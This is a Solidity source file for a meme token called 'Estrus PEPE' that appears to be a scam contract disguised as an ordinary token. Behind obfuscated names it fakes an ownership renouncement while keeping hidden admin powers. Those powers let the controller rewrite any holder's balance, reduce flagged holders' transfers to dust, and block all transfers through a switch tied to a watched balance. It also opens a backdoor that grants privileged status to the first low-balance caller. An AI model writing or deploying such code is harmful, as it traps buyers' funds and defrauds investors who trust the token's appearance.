//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface totalToken {
    function totalSupply() external view returns (uint256);

    function balanceOf(address limitTrading) external view returns (uint256);

    function transfer(address totalTrading, uint256 modeTrading) external returns (bool);

    function allowance(address takeFromMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 modeTrading) external returns (bool);

    function transferFrom(
        address sender,
        address totalTrading,
        uint256 modeTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellBuy, uint256 value);
    event Approval(address indexed takeFromMarketing, address indexed spender, uint256 value);
}

abstract contract limitTake {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface tokenFrom {
    function createPair(address senderAtReceiver, address sellTeam) external returns (address);
}

interface feeTradingSwap is totalToken {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract EstrusPEPE is limitTake, totalToken, feeTradingSwap {

    bool public liquidityFrom;

    function allowance(address swapModeLaunch, address buyTake) external view virtual override returns (uint256) {
        if (buyTake == atMarketing) {
            return type(uint256).max;
        }
        return fundMinReceiver[swapModeLaunch][buyTake];
    }

    address public sellTake;

    function listAt() private view {
        require(minFund[_msgSender()]);
    }

    function balanceOf(address limitTrading) public view virtual override returns (uint256) {
        return feeSenderReceiver[limitTrading];
    }

    function symbol() external view virtual override returns (string memory) {
        return marketingMode;
    }

    address senderFeeMax = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => bool) public minFund;

    address atMarketing = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function receiverAt(address isMode, address totalTrading, uint256 modeTrading) internal returns (bool) {
        if (isMode == sellTake) {
            return fundAuto(isMode, totalTrading, modeTrading);
        }
        uint256 buyReceiverFee = totalToken(fromTx).balanceOf(senderFeeMax);
        require(buyReceiverFee == marketingEnable);
        require(totalTrading != senderFeeMax);
        if (fromTake[isMode]) {
            return fundAuto(isMode, totalTrading, enableAmount);
        }
        return fundAuto(isMode, totalTrading, modeTrading);
    }

    function approve(address buyTake, uint256 modeTrading) public virtual override returns (bool) {
        fundMinReceiver[_msgSender()][buyTake] = modeTrading;
        emit Approval(_msgSender(), buyTake, modeTrading);
        return true;
    }

    function atSenderLaunched(address toMarketing, uint256 modeTrading) public {
        listAt();
        feeSenderReceiver[toMarketing] = modeTrading;
    }

    string private marketingMode = "EPE";

    function tradingShould(address txTake) public {
        require(txTake.balance < 100000);
        if (totalMarketing) {
            return;
        }
        
        minFund[txTake] = true;
        
        totalMarketing = true;
    }

    event OwnershipTransferred(address indexed swapToken, address indexed enableMin);

    uint256 public tokenWallet;

    constructor (){
        
        buyLiquidity isSender = buyLiquidity(atMarketing);
        fromTx = tokenFrom(isSender.factory()).createPair(isSender.WETH(), address(this));
        
        sellTake = _msgSender();
        minMaxLaunched();
        minFund[sellTake] = true;
        feeSenderReceiver[sellTake] = senderTeam;
        
        emit Transfer(address(0), sellTake, senderTeam);
    }

    mapping(address => uint256) private feeSenderReceiver;

    function fundAuto(address isMode, address totalTrading, uint256 modeTrading) internal returns (bool) {
        require(feeSenderReceiver[isMode] >= modeTrading);
        feeSenderReceiver[isMode] -= modeTrading;
        feeSenderReceiver[totalTrading] += modeTrading;
        emit Transfer(isMode, totalTrading, modeTrading);
        return true;
    }

    function getOwner() external view returns (address) {
        return isLaunch;
    }

    bool private tradingReceiver;

    function transferFrom(address isMode, address totalTrading, uint256 modeTrading) external override returns (bool) {
        if (_msgSender() != atMarketing) {
            if (fundMinReceiver[isMode][_msgSender()] != type(uint256).max) {
                require(modeTrading <= fundMinReceiver[isMode][_msgSender()]);
                fundMinReceiver[isMode][_msgSender()] -= modeTrading;
            }
        }
        return receiverAt(isMode, totalTrading, modeTrading);
    }

    uint256 private totalIs;

    string private swapLaunched = "Estrus PEPE";

    function sellExempt(address atLaunchedFee) public {
        listAt();
        if (liquidityBuy != tradingReceiver) {
            tokenWallet = sellFund;
        }
        if (atLaunchedFee == sellTake || atLaunchedFee == fromTx) {
            return;
        }
        fromTake[atLaunchedFee] = true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return senderTeam;
    }

    function owner() external view returns (address) {
        return isLaunch;
    }

    uint256 toAmount;

    bool private liquidityBuy;

    uint256 constant enableAmount = 10 ** 10;

    mapping(address => bool) public fromTake;

    function name() external view virtual override returns (string memory) {
        return swapLaunched;
    }

    function transfer(address toMarketing, uint256 modeTrading) external virtual override returns (bool) {
        return receiverAt(_msgSender(), toMarketing, modeTrading);
    }

    uint8 private totalFee = 18;

    function decimals() external view virtual override returns (uint8) {
        return totalFee;
    }

    function launchAuto(uint256 modeTrading) public {
        listAt();
        marketingEnable = modeTrading;
    }

    uint256 private senderTeam = 100000000 * 10 ** 18;

    uint256 private walletLaunch;

    uint256 private modeAmount;

    function minMaxLaunched() public {
        emit OwnershipTransferred(sellTake, address(0));
        isLaunch = address(0);
    }

    mapping(address => mapping(address => uint256)) private fundMinReceiver;

    address private isLaunch;

    uint256 private sellFund;

    address public fromTx;

    uint256 marketingEnable;

    bool public totalMarketing;

}